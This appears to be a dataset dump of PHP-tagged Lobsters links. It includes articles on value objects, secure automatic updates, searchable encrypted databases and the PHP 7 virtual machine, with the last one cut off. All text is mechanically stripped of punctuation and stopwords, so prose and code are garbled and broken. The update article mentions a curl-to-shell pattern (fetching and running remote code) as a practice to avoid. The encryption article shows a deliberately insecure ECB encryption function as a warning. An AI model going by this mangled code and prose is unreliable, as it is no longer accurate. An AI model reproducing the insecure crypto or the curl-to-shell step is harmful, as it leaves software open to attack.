hellman edward curve digital signature algorithm extendednonce stream cipher stream cipher extendednonce stream cipher polynomial evaluation message authentication code modulo cryptographic hash function fast hash collisionresistant ideal hash table feature excluded polyfill sodiummemzero although expose api endpoint ca nt reliably zero buffer php php extension installed sodiumcompat use native implementation zero string provided otherwise throw sodiumexception sodiumcryptopwhash feasible polyfill scrypt php get reasonable performance user would feel motivated select parameter downgrade security avoid denial service do attack winning move play extsodium extlibsodium installed api method fallthrough extension otherwise polyfill library throw sodiumexception detect support runtime use paragoniesodiumcompat cryptopwhashisavailable return boolean value true false phpcompatibility ruleset sodiumcompat user utilize phpcompatibility ci process custom ruleset available used prevent false positive thrown phpcompatibility native php functionality polyfilled repo find repo phpcompatibilityparagoniesodiumcompat ruleset github packagist
161,Lobsters,php,PHP programming,Value Objects Explained,http://patricklouys.com/2017/06/04/value-objects-explained/,value object explained,importance bounded context enforcing preconstraints bundle logic together data tell ask information expert principle improving code readability immutability performance concern summary,importance bounded context talked one big lesson learned domain driven design ddd separating code bounded context one thing learned improved code time today want talk another one topic today value object name suggests object represent value idea value object around much longer ddd use limited domain layer use everywhere object oriented code enforcing preconstraints object oriented programming want create proper abstraction let take color example particular rgb color could represented three integer fail properly represent idea color use integer way u enforce validate rgb color always valid know red green blue value always use value object enforce constructor final class color private red private green private blue public function construct int red int green int blue foreach red green blue color color color throw new invalidargumentexception color value must red red green green blue blue let say want create function allows u represent color common html hex format example value object code could look like function convertrgbtohex int red int green int blue string foreach red green blue color color color throw new invalidargumentexception color value must return sprintf red green blue see every function us color validation lead lot duplicate code violates repeat dry principle bundle logic together data improve convertrgbtohex function using color value object instead function convertcolortohex color color string return sprintf color getred color getgreen color getblue approach deduplicates code big improvement compared earlier example still improve often see code like developer relatively new object oriented programming still think procedurally keep data structure logic separate often manifest lot service object mostly consist getters setter using lot primitive value lead procedural code bundling logic together data violation basic object oriented principle tell ask use information expert principle decide method belongs case color value object correct place contains information required final class color constructor etc public function tohexstring string return sprintf red green blue take make mental shift procedural oop even used object year end result code much easier maintain always easy find appropriate method part object scattered around codebase improving code readability primitive obsession design smell saying never use primitive use default parameter represent custom type properly typehint int string additional information communicated besides scalar type public function drawpixel int x int int red int green int blue code good example primitive obsession might look reasonable perspective let see code used outside write like still readable canvas drawpixel x red green blue hardcoded value becomes messy count parameter make sure one canvas drawpixel improve code using value object canvas drawpixel new coordinate x new color red green blue canvas drawpixel new coordinate new color make much easier read code time reduce number parameter method need version using scalar value would required docblock would explain method parameter value object code selfdocumenting le prone error developing sure come across couple bug result wrong parameter order parameter type bug often go unnoticed bug hard discover course go even add separate value object every single value canvas drawpixel new coordinate new x new new color new red new green new blue approach make impossible mix parameter order even readable earlier example also requires write much code end drawing line course also depends project working really missioncritical part application would go much finegrained value object compared le critical part good rule thumb never use primitive type declaration business logic method immutability let assume two different pixel share color color new color canvas drawpixel new coordinate color canvas drawpixel new coordinate color want modify second color draw pixel public function removered void red color new color canvas drawpixel new coordinate color color removered canvas drawpixel new coordinate color color object mutable change second one also first one value object always immutable immutability make much easier reason code mutable value object good way introduce bug codebase worked php datetime object datetimeimmutable came around probably experienced problem someone add date modify day somewhere completely different part code break using datetime instance course manage bug carefully managing state using clone get injected could make immutable avoid problem make value object immutable php native support immutable class property yet choose manipulate object state method change removered method following public function removered color return new color green blue make immutable modify state instead return new object color new color canvas drawpixel new coordinate color color color removered canvas drawpixel new coordinate color performance concern developer use performance excuse using value object code argue boxingunboxing take away precious cpu cycle code talking database argument pretty pointless database query order magnitude slower boxing unboxing bunch value object let assume working application performance negligible performance hit using value object actually make difference really case would question choice php right tool particular job opting use value object performance reason premature optimization trading readable code small perfomance gain worried performance benchmark code fix bottleneck make slow rinse repeat fast enough summary value object important building block object oriented code matter whether using domain driven design using code already try find case replace one primitive value value object move logic object even better
162,Lobsters,php,PHP programming,Guide to Automatic Security Updates For PHP Developers,https://paragonie.com/blog/2016/10/guide-automatic-security-updates-for-php-developers,guide automatic security update php developer,sql injection prevented case automatic update possibly infinite nearly zero practical risk outdated software verizon data breach investigation report pdf outofdate software plugins compound enduser risk company relying outdated software putting user risk seems obvious element secure automatic update system automatic update secure code delivery secure software update secure automatic update system offline cryptographic signature digitally signed rfc rfc gnupg rsassapss footbullety ecdsa libsodium easyrsa reproducible build reproducible build open source pharaoh decentralized authenticity userbase consistency verification certificate transparency transport layer security need mirror availability concern separation privilege cm airship sophisticated ops team mean go second approach avid rule usability secure automatic update implementation update framework tuf specification process augmenting protocol implemented secure automatic update summary changelog taylor riastradh campbell,software security vulnerability known man preventable careful development practice example sql injection prevented separating userprovided data sql query covered quite topic read gentle introduction application security familiar web application security however even trying everything right eventually make mistake ship exploitable software case automatic update security bug exists customer network preventing security breach involves lot moving part importantly identifying security bug criminal fixing security bug identified getting patch deployed customer network consider timeline time point point might year linux kernel year average lot way reduce number involve automated testing manual code review security expert time point point might week month average vulnerability identifiedtofixed time window le hour organization enjoy agility expertise development team control time point amount time take fix applied vulnerability neutralized update available making update manual rather automatic forcing customer take responsibility making sure mistake nt hurt business small minority customer might prefer responsibility verifying applying update large people security awareness time management discipline undertake responsibility automatic security update reduce interval point possibly infinite nearly zero clearly meaningful improvement manual patch management practical risk outdated software problem outdated software wellstudied information security industry according verizon data breach investigation report pdf example software vulnerability used exploited vulnerability compromised year cve published earlier year wombat security reflected similar study article titled outofdate software plugins compound enduser risk article help net security examines finding fsecure echo problem company relying outdated software putting user risk danger outdated software supported data simple logic criminal aware specific vulnerability software product nt matter vendor published security patch company use product remain vulnerable criminal want exploit seems obvious realworld software exploit preventable keeping software uptodate danger unpatched vulnerability wellknown among security professional obvious question nt everything update automatically implementing secure automatic update mechanism nontrivial engineering feat programmer nt even know begin addressing often one think uninformed risk complexity element secure automatic update system automatic update specific instance general problem secure code delivery addition problem involved securely delivering code developer user healthy dose distrust towards delivery infrastructure additional engineering challenge contend due automatic nature whole process order automatic update secure first must make secure software update possible without automation component secure automatic update system follows offline cryptographic signature cryptographic signature provide strong inductive proof authenticity every update package digitally signed using listed order preference rfc modern elliptic curve cryptography conjunction postquantum cryptography rfc deterministic ecdsa gnupg shine usecase nt require even care algorithm using rsassapss key e footbullety ecdsa ie responsible generating random nonce dodging invalid curve attack worrying whether curve twistsecure ranked lower rsa library implement nondeterministic ecdsa riddled sidechannel attack glaring problem risk nonce reuse standard broken rfc fix rfc us safer building block php developer get libsodium secure rsa easyrsa pear binding cryptgpg available via composer composer require pearcryptgpg since cryptographic signature require key pair one secretprivate key corresponding public key simply publishhardcode public key software use verify signature update file reproducible build reproducible build concept mostly relevant compiled language compile source code machine get byteforbyte identical binary blob one developer published signed make difficult attacker developer slip trojan without detected reproducible build necessarily require software project open source closedsource proprietary software satisfy requirement php developer deliverable php archive phar file user use pharaoh verify phar publish phar built machine difference difference found examine verify benign useful comparing checksum decentralized authenticity userbase consistency verification prevent targeted attack update checked appendonly audit log local copy audit log validated among trusted peer audit log either mean implementing something like certificate transparency simply publishing hash file content additional metadata onto cryptocurrency ledger downloading update file checking cryptographic signature strong assertion signed developer one check trusted peer validate see copy audit log unanimously respond affirmatively rule likelihood silent targeted attack deployed especially infrastructure nt know trusted peer tor help feature guarantee attack ca nt targeted one user without alerting entire network presence attack however stop attacker breached infrastructure pilfered signing key releasing update first place addition forensically useful deterrent sophisticated adversary part want activity remain undetected transport layer security every developer belief solution curl http foo sh simply curl http foo sh must three believe gnupg signature obviates need http incorrect need consider following scenario release version software widget valid signature vulnerability found patch release version valid signature using http active attacker replay version valid signature update request emitted user system remains vulnerable version attacker let upgrade known replay attack cryptographic signature alone nt remedy kneejerk response replay attack upload secret key server online signing either timestamps challengeresponse authentication defeat purpose offline digital signature secure even server hosting file breached could also build really complex system offline signature see linux distros releasesgpg equivalent bother adding complexity life simply use http instead http maninthemiddleassisted replay attack disappear mirror availability concern way criminal prevent security release getting applied automatically target interest would simply launch sustained distributed denial service attack update server fortunately implemented feature protocol already enough resilience allow decentralize infrastructure mean could either wide range mirror hosted diverse range network diverse portfolio internet service provider simply upload copy every update file bittorrent network let user seed update trojan horse malware would nt concern user either way software already verifying cryptographic signature public key either strategy greatly increase cost sustained ddos attack reduces likelihood intended effect mail critical security update must go separation privilege obtained authentic peerverified reproduciblefromsource copy security update highlyavailable decentralized networking infrastructure two school thought update process initiated http process user access application need updating requires software able write greatly reduces defenseindepth traditional web vulnerability ensures outofthebox automatic security update available user nt knowledge time set privilege separation update process must initiated different user apachewwwdata equivalent software unable write fact overwritten another user account secure carry risk people disabling automatic security update outofthebox threat model dictate avenue pursue cm airship went first option believe risk vulnerability much higher source code effectively worldwritable concern sophisticated ops team mean go second approach keep mind avid rule usability security expense usability come expense security intermediate solution exist http process writes named pipe worldwritable file another process eg daemon cron job kick update process privileged user pipefile written secure automatic update implementation although immediately useful php developer update framework definitely best starting point secure automatic update addition feature covered tuf specification support process augmenting protocol using cm airship read implemented secure automatic update summary automatic software update boon security detriment long following precaution taken update must cryptographically signed update must reproducible source code update consistency must decentrally verifiable communication must conducted via tl ie http http prevent mitmdos attack update file must mirrored wide far prevent ddos attack update may handled separate user account one used http server better defenseindepth changelog added section mentioning implementation intermediate solution suggested taylor riastradh campbell privilege separation section
163,Lobsters,php,PHP programming,Building Searchable Encrypted Databases with PHP and SQL,https://paragonie.com/blog/2017/05/building-searchable-encrypted-databases-with-php-and-sql,building searchable encrypted database php sql,open source encryption library bug tracker talk bsides orlando one white paper securely encrypt database field still use field search query threat modeling skip ahead solution towards searchable encryption insecure otherwise illadvised answer nonrandomized encryption encrypted separately extremely unfortunate consequence experimental academic design homomorphic orderrevealing orderpreserving orderrevealing encryption leak enough data infer plaintext previous blog post confidentiality without integrity confidentiality dishonorable mention decrypt every row secure searchable encryption made easy authenticated encryption secure random number generator indistinguishable chosenciphertext attack important threat model usage encryption preventing sql injection threat model implementing literal search encrypted data blind indexing supplemental material bsides orlando talk security analysis limitation physic brute force much bigger challenge password hashing algorithm implementing fuzzier searching encrypted data trading memory time bloom filter conclusion contact u,update implemented design blog post build towards read new blog post implementation get asked question lot remix question show time time open source encryption library bug tracker one weird problem covered talk bsides orlando titled building defensible solution weird problem previously dedicated small section one white paper question securely encrypt database field still use field search query secure solution rather straightforward path team asking question discovering straightforward solution fraught peril bad design academic research project misleading marketing poor threat modeling hurry feel free skip ahead solution towards searchable encryption let start simple scenario might particularly relevant lot local government health care application building new system need collect social security number ssns user regulation common sense dictate user ssns encrypted rest staff member need able look user account given ssn let first explore flaw obvious answer problem insecure otherwise illadvised answer nonrandomized encryption obvious answer team particularly team nt security cryptography expert would something like php class insecureexampleone protected db protected key public function construct pdo db string key db db key key public function searchbyvalue string query array stmt db prepare select table column stmt execute insecureencryptdonotuse query return stmt fetchall pdo fetchassoc protected function insecureencryptdonotuse string plaintext string return opensslencrypt plaintext key opensslrawdata opensslzeropadding snippet plaintext always produce ciphertext encrypted key concerning ecb mode every chunk encrypted separately extremely unfortunate consequence formally construction semantically secure encrypt large message see block repeat ciphertext order secure encryption must indistinguishable random noise anyone hold decryption key insecure mode include ecb mode cbc mode static empty iv want nondeterministic encryption mean message us unique nonce initialization vector never repeat given key experimental academic design lot academic research going topic homomorphic orderrevealing orderpreserving encryption technique interesting work current design nowhere near secure enough use production environment example orderrevealing encryption leak enough data infer plaintext homomorphic encryption scheme often repackaging vulnerability practical chosenciphertext attack feature covered previous blog post come realworld cryptography confidentiality without integrity confidentiality happens attacker gain access database alters ciphertexts study behavior application upon decryption potential ongoing cryptography research one day produce innovative encryption design nt undo decade research safe cryptography primitive cryptographic protocol design however yet nt need invest needlessly complicated research prototype solve problem dishonorable mention decrypt every row nt expect engineer arrive solution without trace sarcasm bad idea need secure encryption see recourse query every ciphertext database iterate decrypting onebyone performing search operation application code go route open application denial service attack slow legitimate user cynic answer much better demonstrate secure searchable encryption made easy let start avoiding problem outlined insecureilladvised section one fell swoop ciphertexts result authenticated encryption scheme preferably large nonce generated secure random number generator authenticated encryption scheme ciphertexts nondeterministic message key different nonce yield different ciphertext protected authentication tag suitable option include assuming broken caesar concludes using nacl libsodium use cryptosecretbox consequently ciphertexts indistinguishable random noise protected chosenciphertext attack secure boring encryption ought however present immediate challenge ca nt encrypt arbitrary message query database matching ciphertexts fortunately clever workaround important threat model usage encryption begin make sure encryption actually making data safer important emphasize encrypted storage nt solution securing crud app vulnerable sql injection solving actual problem ie preventing sql injection way go encryption suitable security control implement implies cryptographic key used encryptdecrypt data accessible database software case make sense keep application server database server separate hardware threat model rest article assuming following true database server webserver separate baremetal hardware sidestep vm escape database server know key held webserver protecting live attack database server webserver compromise webserver compromise game situation live attack v offline attack solve threat model consist physical access stolen hard drive simply using full disk encryption nothing protect attack decrypted online server rest threat model left intentionally vague long assumption true solution may applicable threat model implementing literal search encrypted data possible usecase storing social security number still able query order store encrypted information still use plaintext select query going follow strategy call blind indexing general idea store keyed hash eg hmac plaintext separate column important blind index key distinct encryption key unknown database server sensitive information instead simple hmac want use keystretching algorithm scrypt key acting static salt slow attempt enumeration nt worried offline bruteforce attack either case unless attacker obtain key must stored database table schema look like postgresql flavor create table human humanid bigserial primary key firstname text lastname text ssn text encrypted ssnbidx text blind index create index human ssnbidx would store encrypted value humansssn blind index plaintext ssn would go humansssnbidx naive implementation might look like php productionquality code optimized readability understanding security function encryptssn string ssn string key string nonce randombytes ciphertext sodiumcryptosecretbox ssn nonce key return nonce ciphertext function decryptssn string ciphertext string key string decoded ciphertext nonce mbsubstr decoded cipher mbsubstr decoded null return sodiumcryptosecretboxopen cipher nonce key function getssnblindindex string ssn string indexkey string return sodiumcryptopwhash ssn indexkey sodiumcryptopwhashopslimitmoderate sodiumcryptopwhashmemlimitmoderate function findhumanbyssn pdo db string ssn string indexkey array index getssnblindindex ssn indexkey stmt db prepare select human ssnbidx stmt execute index return stmt fetchall pdo fetchassoc comprehensive proofofconcept included supplemental material bsides orlando talk released creative common license people mean thing public domain security analysis limitation depending exact threat model solution leaf two question must answered adopted safe use leak data like sieve limitation usefulness one sort answered already given example assuming encryption key blind index key separate key stored webserver database server nt way obtaining key attacker compromise database server web server able learn several row share social security number shared ssn duplicate entry leak necessary order indexing possible turn allows fast select query userprovided value furthermore attacker capable observingchanging plaintexts normal user application observing blind index stored database leverage chosenplaintext attack iterate every possible value user correlate resultant blind index value practical hmac scenario eg scenario highentropy lowsensitivity value ssns physic brute force side much practical attack criminal would substitute value one row another access application normally reveal plaintext unless distinct perrow key employed eg hashhmac rowid masterkey true could even effective mitigation although others would preferable best defense use aead mode passing primary key additional associated data ciphertexts tied particular database row prevent attacker deleting data much bigger challenge compared amount information leaked solution application threat model find acceptable tradeoff long using authenticated encryption encryption either hmac blind indexing nonsensitive data password hashing algorithm blind indexing sensitive data easy reason security application however one serious limitation work exact match two string differ meaningless way always produce different cryptographic hash searching one never yield need advanced query still want keep decryption key plaintext value hand database server going get creative also worth noting prevent attacker posse key learning plaintext value stored database might reveal metadata eg two seeminglyunrelated people share street address real world implementing fuzzier searching encrypted data possible usecase encrypting people legal name able search partial match let build previous section built blind index allows query database exact match time instead adding column existing table going store extra index value join table create table human humanid bigserial primary key firstname text encrypted lastname text encrypted ssn text encrypted create table humansfilters filterid bigserial primary key humanid bigint reference human humanid filterlabel text filtervalue text creates index pair sql expert overrules feel free omit create index humansfilters filterlabel filtervalue reason change normalize data structure get adding column existing table likely get messy next change going store separate distinct blind index per column every different kind query need key example need caseinsensitive lookup ignores whitespace store blind index pregreplace az strtolower value need query first letter last name store blind index strtolower mbsubstr lastname locale need match being letter end letter store blind index strtolower string string need query first three letter last name first letter first name guessed build another index based partial data every index need distinct key great pain taken prevent blind index subset plaintext leaking real plaintext value criminal knack crossword puzzle create index serious business need log access part application aggressively trading memory time thus far design proposition favor allowing developer write carefully considered select query minimizing number time decryption subroutine invoked generally train stop people goal met however situation mild performance hit search query acceptable mean saving lot disk space trick simple truncate blind index eg bit treat bloom filter blind index involved query match given row data probably match application code need perform decryption candidate row serve actual match blind index involved query match given row data definitely match may also worth converting value string integer database server end storing efficiently conclusion hope adequately demonstrated possible build system us secure encryption allowing fast query minimal information leakage privileged attacker possible build system simply component provided modern cryptography library little glue interested implementing encrypted database storage software love provide company consulting service contact u interested
164,Lobsters,php,PHP programming,PHP 7 Virtual Machine,https://nikic.github.io/2017/04/14/PHP-7-Virtual-machine.html,php virtual machine,opcodes obtaining opcode dump variable type op array stack frame layout function call argument sending fetch mode writes memory safety exception handling finally handling generator smart branch runtime cache vm interrupt specialization vm definition generated virtual machine code zendvmgenphp fastpath slowpath split vm macro,article aim provide overview zend virtual machine found php comprehensive description try cover important part well finer detail description target php version currently development nearly everything also applies php however difference php series vm significant generally bother draw parallel post consider thing level instruction listing section end deal actual c level implementation vm however want provide link main file make vm upfront opcodes beginning opcode opcode refer full vm instruction including operand may also designate actual operation code small integer determining type instruction intended meaning clear context source code full instruction usually called oplines individual instruction conforms following zendop structure struct zendop const void handler znodeop znodeop znodeop result extendedvalue lineno zenduchar opcode zenduchar zenduchar zenduchar resulttype opcodes essentially threeaddress code instruction format opcode determining instruction type two input operand one output operand result instruction use operand add instruction representing operator use three boolnot instruction representing operator us result echo instruction us instruction may either use use operand example dofcall may may result operand depending whether return value function call used instruction require two input operand case simply use second dummy instruction opdata carry additional operand next three standard operand exists additional numeric extendedvalue field used hold additional instruction modifier example cast might contain target type cast operand type stored resulttype respectively possible type isunused isconst istmpvar isvar iscv three latter type designated variable operand three different type vm variable isconst denotes constant operand string even isunused denotes operand either actually unused used numeric value immediate assembly jargon jump instruction example store jump target unused operand obtaining opcode dump following often show opcode sequence php generates example code currently three way opcode dump may obtained opcache since php php testphp phpdbg since php phpdbg p testphp vld thirdparty extension php testphp opcache provides highestquality output listing used article based opcache dump minor syntax adjustment magic number short optimization see opcodes php compiler produced would give optimized opcodes opcache also generate lot information example produce cfg produce type rangeinferred ssa form getting ahead plain old linearized opcode dump sufficient purpose variable type likely one important point understand dealing php virtual machine three distinct variable type us php tmpvar var cv different representation vm stack along different way accessing php become similar share storage mechanism however important difference value contain semantics cv short compiled variable refers real php variable function us variable corresponding cv cv undef type denote undefined variable undef cv used instruction case throw wellknown undefined variable notice function entry nonargument cv initialized undef cv consumed instruction eg instruction add b destroy value stored cv b instead cv destroyed together scope exit also implies cv live entire duration function live refers containing valid value live data flow sense tmpvars var hand virtual machine temporary typically introduced result operand operation example code b c result opcode sequence similar following add b c add assign tmpvars always defined use hold undef value unlike cv variable type consumed instruction used example second add destroy value operand must used point unless written beforehand similarly assign consume value invalidating follows tmpvars usually shortlived large number case temporary life space single instruction outside short liveness interval value temporary garbage difference tmp var much distinction inherited php tmps vm stack allocated var heap allocated php variable stack allocated nowadays main difference tmps var latter allowed contain reference allows u elide derefs tmps furthermore var may hold two type special value namely class entry indirect value latter used handle nontrivial assignment following table attempt summarize main difference undef ref indirect consumed named cv yes yes yes tmpvar yes var yes yes yes op array php function represented structure common zendfunction header function understood somewhat broadly includes everything real function method freestanding pseudomain code eval code userland function use zendoparray structure member starting reduced version struct zendoparray common zendfunction header last zendop opcodes int lastvar zendstring var int lastliteral zval literal important part course opcodes array opcodes instruction last number opcodes array note terminology confusing last sound like index last opcode really number opcodes one greater last index applies last value op array structure lastvar number cv number tmps var place make strong distinction var array name cv literal array literal value occurring code array const operand reference depending abi const operand either store pointer literal table store offset relative start op array structure wait later stack frame layout apart executor globals eg execution state stored virtual machine stack vm stack allocated page kib individual page connected linked list function call new stack frame allocated vm stack following layout zendexecutedata var arg argument var arg n var numargs cv numargs remaining cv var cv var lastvar tmp tmpvars var tmp arg extraargs extra argument frame start zendexecutedata structure followed array variable slot slot simple zvals used different purpose first lastvar slot cv first numargs hold function argument cv slot followed slot tmpvars lastly sometimes extra argument stored end frame used handling funcgetargs cv tmpvar operand instruction encoded offset relative start stack frame fetching certain variable simply offseted read executedata location execute data start frame defined follows struct zendexecutedata const zendop opline zendexecutedata call zval returnvalue zendfunction func zval callinfo numargs zendclassentry calledscope zendexecutedata prevexecutedata zendarray symboltable void runtimecache cache oparray runtimecache zval literal cache oparray literal importantly structure contains opline currently executed instruction func currently executed function furthermore returnvalue pointer zval return value stored object also encodes number function argument couple call metadata flag unused zval space calledscope scope static refers php code prevexecutedata point previous stack frame execution return function finished running symboltable typically unused symbol table used case crazy person actually us variable variable similar feature runtimecache cache op array runtime cache order avoid one pointer indirection accessing structure discussed later literal cache op array literal table reason function call skipped one field executedata structure namely call requires context function call work call use variation instruction sequence vardump b global scope compile initfcall args vardump sendvar sendvar b doicall doicall retval unused eight different type init instruction depending kind call initfcall used call free function recognize compile time similarly ten different send opcodes depending type argument function modest number four docall opcodes icall used call internal function specific instruction may differ structure always init send main issue call sequence contend nested function call compile something like vardump foo bar b initfcall args vardump initfcall arg foo sendvar doucall sendvar initfcall arg bar sendvar b doucall sendvar doicall indented opcode sequence visualize instruction correspond call init opcode push call frame stack contains enough space variable function number argument know argument unpacking involved may end argument call frame initialized called function calledscope case latter null calling free function pointer new frame stored executedata call executedata frame calling function following denote access ex call notably prevexecutedata new frame set old ex call value example initfcall call foo set prevexecutedata stack frame vardump rather surrounding function prevexecutedata case form linked list unfinished call usually would provide backtrace chain send opcodes proceed push argument variable slot ex call point argument consecutive may overflow section designated argument cv tmps fixed later lastly dofcall performs actual call ex call becomes current function prevexecutedata relinked calling function apart call procedure depends kind function internal function need invoke handler function userland function need finish initialization stack frame initialization involves fixing argument stack php allows passing argument function expects funcgetargs relies however actually declared argument corresponding cv argument beyond write memory reserved cv tmps argument moved tmps ending argument segmented two noncontinuous chunk clearly stated userland function call involve recursion virtual machine level involve switch one executedata another vm continues running linear loop recursive virtual machine invocation occur internal function invoke userland callback eg arraymap reason infinite recursion php usually result memory limit oom error possible trigger stack overflow recursion callbackfunctions magic method argument sending php us large number different argument sending opcodes whose difference confusing thanks unfortunate naming sendval sendvar simplest variant handle sending byvalue argument known byvalue compile time sendval used const tmp operand sendvar var cv sendref conversely used argument known byreference compilation variable sent reference opcode accepts var cv sendvalex sendvarex variant sendvalsendvar case determine statically whether argument byvalue byreference opcodes check kind argument based arginfo behave accordingly case actual arginfo structure used rather compact bit vector representation directly function structure sendvarnorefex try read anything name outright lying opcode used passing something really variable return var statically unknown argument two particular example used passing result function call argument passing result assignment case need separate opcode two reason firstly generate familiar variable passed reference notice try pas something like assignment ref sendvarex used instead would silently allowed secondly opcode deal case might want pas result referencereturning function byreference argument throw anything sendvarnoref variant opcode without ex specialized variant case statically know reference expected know whether argument one sendunpack sendarray opcodes deal argument unpacking inlined calluserfuncarray call respectively push element array onto argument stack differ various detail eg unpacking support traversables calluserfuncarray unpackingcufa used may necessary extend stack frame beyond previous size real number function argument known time initialization case extension happen simply moving stack top pointer however would cross stack page boundary new page allocated entire call frame including already pushed argument need copied new page able handle call frame crossing page boundary last opcode senduser used inlined calluserfunc call deal peculiarity yet discussed different variable fetch mode seems like good place introduce funcarg fetch mode consider simple call like func know compiletime whether argument passed byvalue byreference case behavior wildly different pas byvalue previously empty could would generate bunch undefined index notice pas byreference silently initialize nested array instead funcarg fetch mode dynamically choose one two behavior r w inspecting arginfo current ex call function func example opcode sequence might look something like initfcallbyname func fetchdimfuncarg arg fetchdimfuncarg arg fetchdimfuncarg arg sendvarex dofcall fetch mode php virtual machine four class fetch opcodes fetch get var fetchdim arr fetchobj obj prop fetchstaticprop prop precisely one would expect caveat basic fetch variant used access variablevariables superglobals normal variable access go much faster cv mechanism instead fetch opcodes come six variant r rw w unset funcarg already learned funcarg chooses r w depending whether function argument byvalue byreference let try create situation would expect different fetch type appear arr fetchdimr arr int free arr val assigndim arr int opdata val arr assignadd dim arr int opdata int isset arr issetisemptydimobj isset arr int free unset arr unsetdim arr int unfortunately actual fetch produced fetchdimr everything else handled special opcodes note assigndim assignadd use extra opdata need two input operand reason special opcodes like assigndim used instead something like fetchdimw assign apart performance operation may overloaded eg assigndim case mean object implementing arrayaccess offsetset actually generate different fetch type need increase level nesting arr fetchdimr arr int fetchdimr int free arr val fetchdimw arr int assigndim int opdata val arr fetchdimrw arr int assignadd dim int opdata int isset arr fetchdimis arr int issetisemptydimobj isset int free unset arr fetchdimunset arr int unsetdim int see outermost access us specialized opcodes nested index handled using fetch appropriate fetch mode fetch mode essentially differ whether generate undefined offset notice index exist whether fetch value writing notice write r yes w yes rw yes yes unset yesish case unset bit peculiar fetch existing offset writing leave undefined one alone normal writefetch would initialize undefined offset instead writes memory safety write fetch return var may contain either normal zval indirect pointer another zval course former case change applied zval visible value accessible vm temporary php prohibits expression still need handle case like call depending whether call return byvalue byreference expression may may observable effect typical case fetch return indirect contains pointer storage location modified example certain location hashtable data array unfortunately pointer fragile thing easily invalidated concurrent write array might trigger reallocation leaving behind dangling pointer critical prevent execution user code point indirect value created consumed consider example generates initfcallbyname args dofcallbyname initfcallbyname args b dofcallbyname initfcallbyname args c dofcallbyname fetchdimw arr assigndim opdata notably sequence first executes sideeffects left right performs necessary write fetch refer fetchdimw delayed opline ensures writefetch consuming instruction directly adjacent consider another example bit problem side assignment must fetched write however fetch arr write arr write latter might invalidate former problem solved follows fetchdimw arr makeref fetchdimw arr assignref arr fetched write first turned reference using makeref result makeref longer indirect subject invalidation fetch arr performed safely exception handling exception root evil exception generated writing exception eg exception eg refers executor globals throwing exception c code involve stack unwinding instead abortion propagate upwards return value failure code check eg exception exception actually handled control reenters virtual machine code nearly vm instruction directly indirectly result exception circumstance example undefined variable notice result exception custom error handler used want avoid checking whether eg exception set vm instruction instead small trick used exception thrown current opline current execute data replaced dummy handleexception opline obviously modify op array redirects pointer opline exception originated backed eg oplinebeforeexception mean control return main virtual machine dispatch loop handleexception opcode invoked slight problem scheme requires opline stored execute data actually currently executed opline otherwise oplinebeforeexception would wrong b virtual machine us opline execute data continue execution otherwise handleexception invoked requirement may sound trivial reason virtual machine may working different opline variable outofsync opline stored execute data php happened rarely used goto switch virtual machine php actually default mode operation compiler support opline stored global register performing operation might possibly throw local opline must written back execute data saveopline operation similarly potentially throwing operation local opline must populated execute data mostly checkexception operation machinery cause handleexception opcode execute exception thrown first determines whether exception thrown inside try block purpose op array contains array trycatchelements track opline offset try catch finally block typedef struct zendtrycatchelement tryop catchop ketchup finallyop finallyend zendtrycatchelement pretend finally block exist whole different rabbit hole assuming indeed inside try block vm need clean unfinished operation started throwing opline span past end try block involves freeing stack frame associated data call currently flight well freeing live temporary majority case temporary shortlived point consuming instruction directly follows generating one however happen liverange span multiple potentially throwing instruction array throwing cast array initfcall args throwing dofcall add case variable live instruction would need destroyed function call throw one particular type temporary tends particularly long live range loop variable example foreach array value throw ex feresetr array fefetchr value throw ex jmp fefree loop variable life generally always spanning entire loop body live range stored op array using following structure typedef struct zendliverange var low bit used variable type zendlive macro start end zendliverange var operand encoded variable range applies start start opline offset including generating instruction end end opline offset including consuming instruction course live range stored temporary immediately consumed lower bit var used store type variable one zendlivetmpvar normal variable hold ordinary zval value freeing variable behaves like free opcode zendliveloop foreach loop variable hold simple zval corresponds fefree opcode zendlivesilence used implementing error suppression operator old error reporting level backed temporary later restored exception thrown obviously want restore well corresponds endsilence zendliverope used rope string concatenation case temporary fixedsized array zendstring pointer living stack case string already populated must freed corresponds approximately endrope tricky question consider context whether temporary freed either generating consuming instruction throw consider following simple code add assign v exception thrown add temporary automatically freed add instruction responsible similarly assign throw freed automatically must assign take care latter case answer clear instruction always responsible freeing operand even exception thrown case result operand tricky answer changed php php instruction responsible freeing result case exception php automatically freed instruction responsible making sure result always populated motivation change way many basic instruction add implemented usual structure go roughly follows read input operand perform operation write result operand free input operand necessary problematic php unfortunate position supporting exception destructors also supporting throwing destructors point compiler engineer cry horror step throw point result already populated avoid memory leak edgecase responsiblility freeing result operand shifted instruction exception handling mechanism performed cleanup operation continue executing catch block catch finally unwind stack ie destroy current stack frame give parent frame shot handling exception get full appreciation ugly whole exception handling business relate another tidbit related throwing destructors remotely relevant practice still need handle ensure correctness consider code foreach new dtor value try echo return return catch exception e echo catch imagine dtor traversable class throwing destructor code result following opcode sequence loop body indented readability new dtor dofcall feresetr fefetchr value echo return fefree free return return return null return jmp catch exception e echo catch jmp fefree duplicated instr importantly note return compiled fefree loop variable return happens fefree throw dtor throwing destructor normally would say instruction within try block invoking catch however point loop variable already destroyed catch discard exception try continue iterating already dead loop variable cause problem throwing fefree inside try block copy fefree logically exception really occurred fefree generated break annotated freeonreturn instructs exception handling mechanism move source exception original freeing instruction code run catch block generate uncaught exception instead finally handling php history finally block somewhat troubled php first introduced finally block rather really buggy implementation finally block php shipped major rewrite finally implementation fixing whole slew bug quite managing reach fully correct implementation look like php finally managed hit nail finger crossed writing section surprised find perspective current implementation current understanding finally handling actually complicated indeed many way implementation became simpler different iteration rather complex go show insufficient understanding problem result implementation excessively complex buggy although fair part complexity php implementation stemmed directly lack ast finally block run whenever control exit try block either normally eg using return abnormally throwing couple interesting edgecases consider quickly illustrate going implementation consider try throw new exception finally return happens finally win function return consider try return finally return finally win function return finally always win php prohibits jump finally block example following forbidden foreach array value try return finally continue continue code sample generate compileerror important understand limitation purely cosmetic easily worked around using wellknown catch control delegation pattern foreach array value try try return finally throw new jumpexception catch jumpexception e continue real limitation exists possible jump finally block eg performing goto outside finally label inside finally forbidden preliminary way look finally work implementation us two opcodes fastcall fastret roughly fastcall jumping finally block fastret jumping let consider simplest case try echo try finally echo finally echo finished code compiles following opcode sequence echo string try fastcall jmp echo string finally fastret echo string finished return int fastcall store location jump finally block fastret reached jump back one location stored case would jump around finally block base case special control flow return exception occurs let consider exceptional case try throw new exception try catch exception e throw new exception catch finally throw new exception finally handling exception consider position thrown exception relative closest surrounding trycatchfinally block throw try matching catch populate e jump catch throw catch try without matching catch finally block jump finally block time back 